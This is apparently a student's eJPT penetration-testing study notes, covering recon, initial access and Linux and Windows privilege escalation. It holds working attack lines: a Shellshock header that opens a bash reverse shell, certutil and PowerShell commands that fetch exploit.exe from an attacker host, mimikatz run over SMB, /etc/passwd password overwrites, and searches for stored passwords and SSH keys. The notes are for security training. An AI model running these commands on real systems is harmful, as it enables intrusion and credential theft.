# eJPT Study Notes

- Reference: [eJPT Preparation Course | Penetration Testing by PhD Security](https://www.youtube.com/watch?v=pdgBU9MDAwE)

- [Web Recon](WebRecon.md)

- Skipping Web Attacks for now [23:32 - 6:00:00]

- [Network Recon](NetworkRecon.md)
- [FTP Enum Exploit](FTPEnumExploit.md)
- [Active Directory](ActiveDirectory.md)
- [Pivoting](Pivoting.md)

## Common Knowledge
### Discovery
```
# cgi-bin:
if cgi-bin is present, always perform shellshock attack on a login form.
    exploit:
    User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1
if the exploit doesnt work, try finding files in /cgi-bin using gobuster like .sh files .c files etc, then use Remote Code Injection vulnerability available in searchsploit.
```

### Initial Access
```
While grabbing a reverse shell either linux or windows use rlwrap
command:
    rlwrap nc -vnlp 1234
```
```
Converting to a full-tty shell after getting a shell:
    python -c 'import pty;pty.spawn("/bin/bash")
    <CLTR+Z>
    stty raw -echo
    fg
    <ENTER> <ENTER>
``` 

### Lateral Movement
- Reference #1: [https://sushant747.gitbooks.io/total-oscp-guide/content/windows.html](https://sushant747.gitbooks.io/total-oscp-guide/content/windows.html)
- Reference #2: [https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)
- Reference #3: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- Reference #4: [https://fuzzysecurity.com/tutorials/16.html](https://fuzzysecurity.com/tutorials/16.html)


### Privilege Escalation
### Linux:
- Reference #1: [GTFObins](https://gtfobins.github.io/)
- Reference #2: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#looting-for-passwords)
- Reference #3: [HackTricks.xyz](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
```
Checklist:
  1) check sudo -l
  2) check for suid perms :
   ```
     # Find all SUID files:
     find / -perm -4000 -print
     # Find all SGID files:
     find / -perm -2000 -print  
     find / -perm -4000 -type f -exec ls -la {} 2>/dev/null"
     find / -perm -u=s -type f 2>/dev/null
   ```
  3) check mounts
  4) check others users in the host
  5) check kernel version/sudo version
  6) check cronjobs/services scheduled.
  7) check for config files or password files.
  9) check permission of /etc/shadow and /etc/passwd
 10) check the history of the bash shell by typing "history"
 11) find for password files in FS using "locate password | more"
 12) find SSH id_rsa or authorized keys using "find / -name id_rsa|root_key 2>/dev/null"

LOLBin:
  1) mkpasswd: To make new password for a new user/exisiting user, by editing the /etc/passwd or /etc/shadow
  command:
      mkpasswd -m sha-512 pass123
  2) openssl: TO make password in /etc/passwd
  command:
      openssl passwd pass123
  note: After generating this password, replace the 'x' in the /etc/passwd of the user with this string.

Uncommon SUID binaries:
  1) tmux
  2) cpulimit
  3) mawk

Tools available to automate PE
  1) linPEAS
  2) LinEnum
  3) enum4linux
```

### Windows:
- Reference #1: [LOLBAS](https://lolbas-project.github.io/)
- Reference #2: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- Reference #3: [HackTricks.xyz](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)
```
Checklist:
  1) Find the console history of powershell using the following command.
  command:
        C:\users\<username>\appdata\roaming\microsoft\windows\powershell\psreadline>type ConsoleHost_History.txt
  2) whoami /all
  note: 
  - if the output of the last command (/priv) has "SeImpersonatePrivilege" enabled, then PE can be done using potato attack. (rogue potato)
  - /groups is mainly used in AD environments.


LOLBin:
  1) certutil: Can be used to fetch files from a server.
  command:
        certutil -split -f -urlcache http://attacker-ip.com/exploit.exe 
  2) powershell: To put fetch files from a server.
  command:
        powershell -c 'IEX(New-Object Net.WebClient).downloadString("http://attacker.com/exploit.exe")'
  3) net use: If we need to fetch file from an smb server to the victim machine.
  command:
        net use \\<smb-ip>\share /u:username password
        cd \\<smb-ip>\share
        .\mimikatz.exe
  4) route print: To print the route as well as gives information about other hosts in the network.
  command:
        route print
  5) arp: To find all the hosts in the network and what devices it is communicating to.
  command:
        arp -a
  6) netstat: To find all the established connections on a host and all the available ports and their services.
  command:
        netstat -ano
  7) findstr: Finding sensitive strings within the victim filesystem.
  command:
        findstr /si password *.txt
        findstr /si password *.xml
        findstr /si password *.ini
        findstr /spin password *.*
  8) reg: Search for passwords in registry
  command:
        reg query HKLM /f password /t REG_SZ /s
  9) systeminfo: Get information of the system.
  command:
        systeminfo

  
  

Tools available to automate PE:
  1) Windows-Exploit-Suggester (suitable for older machines)
  2) winPEAS
  3) 411Hall/JAWS 
  4) PowerSploit/PowerUp
  5) enum4linux
```